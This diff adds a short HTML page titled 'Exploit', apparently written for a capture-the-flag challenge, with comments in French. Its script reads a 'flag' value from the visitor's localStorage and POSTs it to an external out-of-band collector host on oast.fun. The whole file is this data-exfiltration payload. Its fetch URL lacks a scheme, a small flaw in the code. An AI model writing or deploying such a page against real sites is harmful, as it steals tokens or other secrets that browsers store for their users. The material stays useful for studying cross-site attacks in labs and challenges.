@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Exploit</title>
+</head>
+<body>
+  <script>
+    // Lire le flag depuis le localStorage
+    const flag = localStorage.getItem('flag');
+    // Envoyer le flag à votre serveur
+    fetch('pyjcdwigptdljjusjisr5wmwlliz7b966.oast.fun', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ flag: flag }),
+    });
+  </script>
+</body>
+</html>
